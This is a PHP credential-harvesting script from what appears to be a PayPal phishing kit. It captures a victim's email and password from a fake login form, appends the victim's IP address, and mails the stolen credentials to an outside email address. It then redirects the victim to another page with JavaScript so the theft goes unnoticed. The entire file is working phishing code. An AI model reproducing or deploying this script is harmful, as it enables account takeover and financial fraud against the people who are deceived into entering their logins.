<?
$ip = getenv("REMOTE_ADDR");
$message = "+--------------- Credit Card InformationS -----------+\n";
$message .= "+---------------------- Result ------------+\n";
$message .= "EMail : ".$_POST['racho0']."\n";
$message .= "PASSWORD: ".$_POST['racho00']."\n";

$message .= "+-------------[ Created By Yasser ]--------------------+\n";
$message .= "Client IP : ".$ip."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "+-------------------+ By Zebii +--------------------+\n";

$send = "Salmane-Segame@live.Fr";
$subject = "$ip | PayPal Account";
$headers = "From: spartacus_11 <xzx@live.fr>"; 

mail("$send", "$subject", $message, $headers);   
?>

<?php
echo '<script language="Javascript">
<!--
document.location.replace("eab5752c61ff4056de61d2d350f19e5e.htm");
// -->
</script>';
?>


